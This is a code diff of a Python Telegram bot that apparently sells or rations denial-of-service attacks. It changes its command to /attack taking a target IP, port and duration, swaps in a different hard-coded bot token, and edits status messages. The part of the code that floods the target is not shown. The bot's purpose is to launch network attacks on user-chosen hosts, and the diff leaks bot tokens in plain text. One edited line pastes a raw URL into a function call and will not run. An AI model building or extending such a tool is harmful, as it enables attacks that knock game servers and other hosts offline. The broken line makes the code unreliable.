@@ -8,7 +8,7 @@ import aiohttp
 import threading
 import random
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7899170021:AAHVPjHNmDPwKwOdpyyQtOY5nVBBblWogPk')
+bot = telebot.TeleBot('7899170021:AAFlXngA8zK_i9HCrXsoCx6qVPB0AxiYNNQ')
 
 
 # Admin user IDs
@@ -88,7 +88,7 @@ def is_user_in_channel(user_id):
         return member.status in ['member', 'administrator', 'creator']
     except:
         return False
-@bot.message_handler(commands=['tabish'])
+@bot.message_handler(commands=['attack'])
 def handle_attack(message):
     global global_last_attack_time
 
@@ -122,7 +122,7 @@ def handle_attack(message):
         return
 
     if len(command) != 4:
-        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /tabish `<IP>` `<PORT>` `<TIME>`")
+        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -157,7 +157,7 @@ def handle_attack(message):
                                                         f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** {time_duration}𝙨\n"
                                                         f"⚡ **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊𝐒:** {remaining_attacks}\n"
                                                         f"📸 **𝐆𝐀𝐌𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐁𝐇𝐄𝐉 𝐃𝐄!**\n"
-                                                        f"⏳ **𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒: 100%**")
+                                                        f"⏳ **𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒: 0%**")
 
     pending_feedback[user_id] = True  
 
@@ -292,7 +292,7 @@ def handle_screenshot(message):
         bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)
 
         # 🔥 Send Confirmation with SS Number  
-        bot.send_message(CHANNEL_USERNAME, 
+        bot.send_message(https://t.me/+SCgV7yRZK3Q3YTA1, 
                          f"📸 **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃!**\n"
                          f"👤 **𝐔𝐒𝐄𝐑:** `{user_name}`\n"
                          f"🆔 **𝐈𝐃:** `{user_id}`\n"
